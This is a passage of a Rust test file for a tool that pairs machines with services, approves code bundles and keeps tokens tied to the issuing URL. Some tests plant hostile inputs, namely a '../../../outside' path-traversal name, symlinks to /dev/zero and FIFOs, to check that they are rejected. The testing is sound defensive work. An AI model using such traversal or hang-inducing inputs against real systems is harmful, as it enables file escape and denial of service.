    machine.revoke(&paired[1].id, bundle.hash()).unwrap();
    assert!(store.get(&bundle.hash()).unwrap().is_none());
}

#[tokio::test]
async fn opening_the_home_prunes_the_runtime_copies_nothing_approves() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let approved = bundle("transcribe", "1.0.0", "print('hi')");
    let dropped = bundle("transcribe", "0.9.0", "print('old')");
    approve(&machine, &service, &paired, &approved).await;
    let store = machine.home().bundle_store();
    store.put(&approved).unwrap();
    store.put(&dropped).unwrap();
    drop(machine);

    let machine = open_machine(dir.path());
    let store = machine.home().bundle_store();
    assert!(store.get(&approved.hash()).unwrap().is_some());
    assert!(store.get(&dropped.hash()).unwrap().is_none());
}

#[tokio::test]
async fn unpairing_tells_the_service_and_keeps_the_folder() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    approve(&machine, &service, &paired, &bundle).await;
    let store = machine.home().bundle_store();
    store.put(&bundle).unwrap();
    let hook = machine.home().hook(&paired.id, "transcribe");
    std::fs::create_dir_all(hook.parent().unwrap()).unwrap();
    std::fs::write(&hook, "#!/bin/sh\n").unwrap();

    machine.unpair(&paired.id).await.unwrap();
    assert_eq!(service.forgotten(), ["moil_token_1"]);
    assert!(service.tokens().is_empty());
    assert!(tokens(dir.path()).is_empty());
    assert!(!machine.home().pairing_file(&paired.id).exists());

    // The service, its approvals and hooks stay, for pairing again.
    let known = machine.service(&paired.id).unwrap();
    assert_eq!(known.pairing, None);
    assert!(!machine.is_paired(&known).unwrap());
    assert!(known.is_approved(&bundle.hash()));
    assert_eq!(
        machine.approved_bundle(&paired.id, bundle.hash()).unwrap(),
        Some(bundle.clone())
    );
    assert!(hook.is_file());
    assert!(
        store.get(&bundle.hash()).unwrap().is_none(),
        "no paired service approves it, so it can't run"
    );
    assert!(matches!(
        machine.bundles(&paired.id).await,
        Err(Error::NotPaired(_))
    ));
    let err = machine.unpair(&paired.id).await.unwrap_err();
    assert!(matches!(err, Error::NotPaired(_)), "{err}");

    let again = pair(&machine, &service).await;
    assert_eq!(again.id, paired.id);
    assert!(again.is_approved(&bundle.hash()));
}

#[tokio::test]
async fn unpairing_works_even_when_the_service_already_forgot_the_machine() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;

    service.remove_machine("moil_token_1");
    let err = machine.bundles(&paired.id).await.unwrap_err();
    assert!(matches!(err, Error::Unauthorized), "{err}");

    machine.unpair(&paired.id).await.unwrap();
    assert_eq!(machine.services().unwrap()[0].pairing, None);
}

/// A service's folder, as git would copy it to another machine: the
/// `.gitignore` leaves its pairing and logs behind.
fn clone_folder(from: &Path, to: &Path) {
    std::fs::create_dir_all(to).unwrap();
    for entry in std::fs::read_dir(from).unwrap() {
        let entry = entry.unwrap();
        let name = entry.file_name();
        if name == "pairing.json" || name == "logs" {
            continue;
        }
        if entry.file_type().unwrap().is_dir() {
            clone_folder(&entry.path(), &to.join(&name));
        } else {
            std::fs::copy(entry.path(), to.join(&name)).unwrap();
        }
    }
}

#[tokio::test]
async fn pairing_adopts_a_folder_cloned_from_another_machine() {
    let service = FakeService::start("klisi").await;
    let (first, second) = (tempfile::tempdir().unwrap(), tempfile::tempdir().unwrap());
    let laptop = open_machine(first.path());
    let paired = pair(&laptop, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    approve(&laptop, &service, &paired, &bundle).await;
    let hook = laptop.home().hook(&paired.id, "transcribe");
    std::fs::create_dir_all(hook.parent().unwrap()).unwrap();
    std::fs::write(&hook, "#!/bin/sh\n").unwrap();
    let executable = std::os::unix::fs::PermissionsExt::from_mode(0o755);
    std::fs::set_permissions(&hook, executable).unwrap();

    let desktop = open_machine(second.path());
    clone_folder(
        &laptop.home().service_dir(&paired.id),
        &desktop.home().service_dir(&paired.id),
    );
    // Known, with its approvals, but not paired: it has no pairing.json,
    // and this machine holds no token for it.
    let known = desktop.service(&paired.id).unwrap();
    assert_eq!(known.pairing, None);
    assert!(!desktop.is_paired(&known).unwrap());
    assert!(known.is_approved(&bundle.hash()));
    assert!(desktop.problems().is_empty(), "{:?}", desktop.problems());
    assert!(matches!(
        desktop.review(&paired.id, bundle.hash()).await,
        Err(Error::NotPaired(_))
    ));

    let adopted = pair(&desktop, &service).await;
    assert_eq!(adopted.id, paired.id);
    assert_eq!(adopted.approvals, known.approvals);
    assert_eq!(adopted.pairing.as_ref().unwrap().machine_id, "m_2");
    assert!(desktop.is_paired(&adopted).unwrap());
    assert_eq!(desktop.services().unwrap(), std::slice::from_ref(&adopted));
    assert!(desktop.home().hook(&adopted.id, "transcribe").is_file());
    assert_eq!(
        desktop.approved_bundle(&adopted.id, bundle.hash()).unwrap(),
        Some(bundle)
    );
    assert_eq!(
        service.forgotten(),
        [] as [String; 0],
        "the laptop stays paired"
    );
}

#[tokio::test]
async fn a_new_service_gets_an_id_no_folder_uses() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let url = url::Url::parse(&service.base_url).unwrap();
    let derived = format!("{}-{}", url.host_str().unwrap(), url.port().unwrap());
    // A folder of that name that moil ignores, and one for another URL.
    let services = dir.path().join("services");
    std::fs::create_dir_all(services.join(&derived)).unwrap();
    std::fs::create_dir_all(services.join(format!("{derived}-2"))).unwrap();
    std::fs::write(
        services.join(format!("{derived}-2/service.json")),
        r#"{"base_url": "https://elsewhere.example.com/moil", "name": "elsewhere"}"#,
    )
    .unwrap();

    let paired = pair(&machine, &service).await;
    assert_eq!(paired.id.as_str(), format!("{derived}-3"));
}

#[tokio::test]
async fn approvals_that_dont_count_are_ignored_and_reported() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let intact = bundle("transcribe", "1.0.0", "print('one')");
    let missing = bundle("transcribe", "2.0.0", "print('two')");
    let changed = bundle("transcribe", "3.0.0", "print('three')");
    let renamed = bundle("summarize", "1.0.0", "print('four')");
    for bundle in [&intact, &missing, &changed, &renamed] {
        approve(&machine, &service, &paired, bundle).await;
    }
    let id = &paired.id;

    std::fs::remove_dir_all(approved_dir(&machine, &paired, &missing)).unwrap();
    overwrite(
        &approved_dir(&machine, &paired, &changed).join("job.py"),
        "import os\n",
    );
    let unsafe_name = bundle("sneaky", "1.0.0", "print('five')");
    edit_json(&machine.home().service_file(id), |file| {
        let approvals = file["approvals"].as_array_mut().unwrap();
        approvals[3]["version"] = "9.9.9".into();
        let mut escaping = approvals[0].clone();
        escaping["name"] = "../../../outside".into();
        escaping["hash"] = unsafe_name.hash().to_string().into();
        approvals.push(escaping);
        approvals.push(approvals[0].clone());
    });
    // A folder under bundles/ that no approval names, and doesn't hold the
    // bundle it's named for.
    let stray = machine
        .home()
        .approved_bundles_dir(id)
        .join("transcribe")
        .join(unsafe_name.hash().to_string());
    std::fs::create_dir_all(&stray).unwrap();

    let known = machine.service(id).unwrap();
    let counted: Vec<_> = known.approvals.iter().map(|a| a.hash).collect();
    assert_eq!(counted, [intact.hash()]);
    assert_eq!(known.approved_hashes(), [intact.hash()]);

    let problems = machine.problems();
    let at = |bundle: &Bundle, name: &str| {
        let path = format!("services/{id}/bundles/{name}/{}", bundle.hash());
        problem_at(&problems, &path).message.clone()
    };
    for (message, says) in [
        (at(&missing, "transcribe"), "aren't all here"),
        (at(&changed, "transcribe"), "don't hash to"),
        (
            at(&renamed, "summarize"),
            "the bundle here is \"summarize\" \"1.0.0\"",
        ),
    ] {
        assert!(message.contains(says), "{message}");
        assert!(
            message.starts_with("moil ignores the approval"),
            "{message}"
        );
    }
    let service_json = format!("services/{id}/service.json");
    let about_the_file: Vec<&str> = problems
        .iter()
        .filter(|p| p.path == Path::new(&service_json))
        .map(|p| p.message.as_str())
        .collect();
    assert_eq!(about_the_file.len(), 2, "{problems:#?}");
    assert!(about_the_file[0].contains("\"../../../outside\" isn't a bundle's name"));
    assert!(about_the_file[1].contains("more than once"));
    assert!(
        problem_at(
            &problems,
            &format!("services/{id}/bundles/transcribe/{}", unsafe_name.hash())
        )
        .message
        .contains("doesn't hold the bundle")
    );
    assert_eq!(problems.len(), 6, "{problems:#?}");
    assert!(!dir.path().join("outside").exists());

    // Approving one again makes it count.
    let review = machine.review(id, changed.hash()).await.unwrap();
    assert!(!review.approved);
    assert!(
        machine
            .approve(&review)
            .unwrap()
            .is_approved(&changed.hash())
    );
}

/// A service's token goes only to the base URL the machine paired with
/// (spec/machine.md §1.2).
#[tokio::test]
async fn a_pairing_for_another_base_url_doesnt_count() {
    let old = FakeService::start("klisi").await;
    let new = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &old).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    approve(&machine, &old, &paired, &bundle).await;

    // Someone points the folder at another service.
    edit_json(&machine.home().service_file(&paired.id), |file| {
        file["base_url"] = new.base_url.as_str().into();
    });
    let moved = machine.service(&paired.id).unwrap();
    assert_eq!(moved.pairing, None);
    assert!(!machine.is_paired(&moved).unwrap());
    assert!(
        moved.is_approved(&bundle.hash()),
        "the approvals are the folder's"
    );
    let problems = machine.problems();
    let problem = problem_at(&problems, &format!("services/{}/pairing.json", paired.id));
    assert!(
        problem.message.contains(&old.base_url) && problem.message.contains(&new.base_url),
        "{problem:?}"
    );
    for err in [
        machine.bundles(&paired.id).await.unwrap_err(),
        machine.review(&paired.id, bundle.hash()).await.unwrap_err(),
    ] {
        assert!(matches!(err, Error::NotPaired(_)), "{err}");
    }
    assert_eq!(new.presented(), [] as [String; 0]);

    // Pairing with the new one adopts the folder, and the old service is
    // told to forget the machine, with the token it issued.
    let adopted = pair(&machine, &new).await;
    assert_eq!(adopted.id, paired.id);
    assert!(adopted.is_approved(&bundle.hash()));
    until("the old service to forget the machine", || {
        old.forgotten() == ["moil_token_1"]
    })
    .await;
    assert!(
        new.presented()
            .iter()
            .all(|token| new.tokens().contains(token))
    );
    assert!(machine.problems().is_empty(), "{:?}", machine.problems());
}

/// Points both of a service's files at `url`, as a `git pull` could, or
/// a folder cloned in place of one that was deleted: they are plain files.
fn point_files_at(machine: &Machine, service: &Service, url: &str) {
    let home = machine.home();
    for file in [
        home.service_file(&service.id),
        home.pairing_file(&service.id),
    ] {
        edit_json(&file, |file| file["base_url"] = url.into());
    }
}

/// The token goes only to the base URL it was issued for, whatever the
/// home's files say (spec/machine.md §1.2).
#[tokio::test]
async fn files_naming_another_url_never_get_the_token_sent_there() {
    let klisi = FakeService::start("klisi").await;
    let elsewhere = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &klisi).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    klisi.host(&bundle);
    elsewhere.host(&bundle);

    point_files_at(&machine, &paired, &elsewhere.base_url);
    let pointed = machine.service(&paired.id).unwrap();
    assert!(pointed.pairing.is_some(), "the files agree with each other");
    assert!(!machine.is_paired(&pointed).unwrap());
    for err in [
        machine.bundles(&paired.id).await.unwrap_err(),
        machine.review(&paired.id, bundle.hash()).await.unwrap_err(),
    ] {
        assert!(matches!(err, Error::NotPaired(_)), "{err}");
    }

    // Unpairing tells the service that issued the token, and only it.
    machine.unpair(&paired.id).await.unwrap();
    assert_eq!(klisi.forgotten(), ["moil_token_1"]);
    assert_eq!(elsewhere.presented(), [] as [String; 0]);
    assert!(tokens(dir.path()).is_empty());
}

#[tokio::test]
async fn pairing_again_tells_only_the_service_that_issued_the_old_token() {
    let klisi = FakeService::start("klisi").await;
    let elsewhere = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    pair(&machine, &klisi).await;
    // So that the token kept, moil_token_2, is one `elsewhere` never issues.
    let paired = pair(&machine, &klisi).await;
    until("klisi to forget the first token", || {
        klisi.forgotten() == ["moil_token_1"]
    })
    .await;

    point_files_at(&machine, &paired, &elsewhere.base_url);
    let adopted = pair(&machine, &elsewhere).await;
    assert_eq!(adopted.id, paired.id);
    until("klisi to forget the token it issued", || {
        klisi.forgotten() == ["moil_token_1", "moil_token_2"]
    })
    .await;
    assert!(!elsewhere.presented().contains(&"moil_token_2".to_owned()));
    assert_eq!(elsewhere.forgotten(), [] as [String; 0]);
    assert_eq!(
        issued_tokens(dir.path()).into_values().collect::<Vec<_>>(),
        [(elsewhere.base_url.clone(), "moil_token_1".to_owned())]
    );
}

/// Runs `work` on a thread of its own, failing the test if it doesn't
/// return within [`PATIENCE`] rather than hanging it.
fn without_hanging<T: Send + 'static>(what: &str, work: impl FnOnce() -> T + Send + 'static) -> T {
    let (done, result) = std::sync::mpsc::channel();
    std::thread::spawn(move || done.send(work()));
    result
        .recv_timeout(PATIENCE)
        .unwrap_or_else(|_| panic!("{what} hung"))
}

fn mkfifo(path: &Path) {
    use std::os::unix::ffi::OsStrExt;
    let path = std::ffi::CString::new(path.as_os_str().as_bytes()).unwrap();
    // SAFETY: `path` is a valid C string.
    assert_eq!(unsafe { libc::mkfifo(path.as_ptr(), 0o600) }, 0);
}

/// What someone who can push to a service folder's repository could
/// commit in place of its files: each is a problem, and reading the home
/// neither hangs nor reads anything else.
#[tokio::test]
async fn links_and_fifos_in_a_service_folder_are_problems_not_hangs() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    approve(&machine, &service, &paired, &bundle).await;
    let bundle_dir = approved_dir(&machine, &paired, &bundle);
    let folder = format!("services/{}", paired.id);
    let problem = |path: String| {
        let reader = machine.clone();
        let problems = without_hanging("reading the home", move || reader.problems());
        problem_at(&problems, &path).message.clone()
    };

    let link_to_zeros = |path: &Path| std::os::unix::fs::symlink("/dev/zero", path).unwrap();
    let replacements: [&dyn Fn(&Path); 2] = [&link_to_zeros, &mkfifo];
    for make in replacements {
        let job_py = bundle_dir.join("job.py");
        std::fs::remove_file(&job_py).unwrap();
        make(&job_py);
        let message = problem(format!("{folder}/bundles/transcribe/{}", bundle.hash()));
        assert!(message.contains("job.py isn't a regular file"), "{message}");
        std::fs::remove_file(&job_py).unwrap();
        std::fs::write(&job_py, bundle.script()).unwrap();
    }
    assert!(machine.problems().is_empty(), "{:?}", machine.problems());

    let home = machine.home();
    for (file, path) in [
        (
            home.pairing_file(&paired.id),
            format!("{folder}/pairing.json"),
        ),
        (
            home.service_file(&paired.id),
            format!("{folder}/service.json"),
        ),
    ] {
        let text = std::fs::read(&file).unwrap();
        std::fs::remove_file(&file).unwrap();
        mkfifo(&file);
        let message = problem(path);
        assert!(message.contains("isn't a regular file"), "{message}");
        std::fs::remove_file(&file).unwrap();
        std::fs::write(&file, text).unwrap();
    }
}

/// As a home kept in git could have it after a pull.
#[test]
fn a_readme_that_isnt_a_file_is_written_anew_without_hanging() {
    let dir = tempfile::tempdir().unwrap();
    let readme = dir.path().join("README.md");
    std::os::unix::fs::symlink("/dev/zero", &readme).unwrap();
    let root = dir.path().to_owned();
    drop(without_hanging("opening the home", move || {
        open_machine(&root)
    }));
    assert!(!readme.symlink_metadata().unwrap().is_symlink());
    assert_eq!(std::fs::read_to_string(&readme).unwrap(), README_TEXT);
}

#[tokio::test]
async fn service_and_pairing_files_are_strict() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let home = machine.home();
    let folder = format!("services/{}", paired.id);

    let pairing = std::fs::read_to_string(home.pairing_file(&paired.id)).unwrap();
    let doubled = pairing.replacen(
        "\"machine_id\"",
        "\"machine_id\": \"m_9\", \"machine_id\"",
        1,
    );
    std::fs::write(home.pairing_file(&paired.id), doubled).unwrap();
    assert_eq!(machine.service(&paired.id).unwrap().pairing, None);
    let problems = machine.problems();
    let problem = problem_at(&problems, &format!("{folder}/pairing.json"));
    assert!(problem.message.contains("duplicate key"), "{problem:?}");
    std::fs::write(home.pairing_file(&paired.id), pairing).unwrap();
    assert!(machine.service(&paired.id).unwrap().pairing.is_some());

    edit_json(&home.service_file(&paired.id), |file| {
        file["approvls"] = serde_json::json!([]);
    });
    assert_eq!(machine.services().unwrap(), []);
    let err = machine.service(&paired.id).unwrap_err();
    assert!(
        matches!(err, Error::Invalid { .. })
            && err.to_string().contains("unknown field `approvls`"),
        "{err}"
    );
    let problems = machine.problems();
    let problem = problem_at(&problems, &format!("{folder}/service.json"));
    assert!(problem.message.contains("approvls"), "{problem:?}");
}
